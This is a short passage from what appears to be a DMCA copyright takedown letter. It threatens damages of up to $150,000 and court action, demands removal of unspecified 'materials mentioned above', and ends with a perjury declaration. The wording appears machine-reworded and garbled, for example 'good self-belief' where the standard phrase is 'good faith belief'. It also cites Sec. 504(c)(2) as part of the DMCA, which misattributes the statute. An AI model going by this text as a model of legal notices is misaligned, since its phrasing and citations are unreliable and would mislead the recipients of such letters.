I do believe you've deliberately infringed our legal rights under 17 U.S.C. Section 101 et seq. and could be liable for statutory damage as high as $150,000 as set forth in Sec. 504 (c)(2) of the Digital Millennium Copyright Act (DMCA) therein.

This letter is official notification. I demand the elimination of the infringing materials mentioned above. Take note as a service provider, the DMCA requires you to eliminate and/or disable access to the copyrighted content upon receipt of this notice. If you do not stop the utilization of the above mentioned infringing content a court action will be commenced against you.

I have a good self-belief that use of the copyrighted materials mentioned above as presumably violating is not approved by the copyright owner, its legal agent, as well as law.

I declare, under penalty of perjury, that the information in this notification is accurate and hereby affirm that I am permitted to act on behalf of the owner of an exclusive right that is allegedly infringed.

Very truly yours,
